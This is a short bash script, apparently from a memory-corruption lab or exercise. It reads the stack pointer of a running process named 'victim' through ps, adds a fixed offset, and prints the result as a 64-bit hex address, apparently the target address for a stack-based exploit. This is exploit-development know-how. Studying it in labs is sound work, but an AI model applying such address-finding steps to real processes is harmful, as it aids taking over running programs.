#!/bin/bash

sp=`ps --no-header -C victim -o esp`
a=`printf %016x $((0x7fff$sp+184))`
echo $a
